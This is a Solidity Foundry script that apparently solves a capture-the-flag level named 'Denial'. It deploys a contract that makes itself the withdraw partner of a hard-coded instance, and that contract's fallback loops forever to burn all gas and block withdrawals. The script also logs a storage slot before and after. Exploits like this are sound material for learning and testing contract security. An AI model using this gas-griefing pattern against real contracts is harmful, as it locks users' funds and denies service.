// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    receive() external payable;
    function contractBalance() external view returns (uint256);
}
contract DenialAttack {
    constructor(IDenial denial) {
        denial.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        while(true) {}
    }
}
contract DenialSolve is Script {
    address instance = 0x0449383F92F80Feb0EF6e4FA7e5F7dC51BBACf3d;
    IDenial denial = IDenial(payable(instance));

    function run() external {
        vm.startBroadcast();

        bytes32 slot = vm.load(instance, bytes32(uint256(1)));
        console.log(uint256(slot));

        DenialAttack attk = new DenialAttack(denial);
        
        slot = vm.load(instance, bytes32(uint256(1)));
        console.log(uint256(slot));

        vm.stopBroadcast();
    }
    
}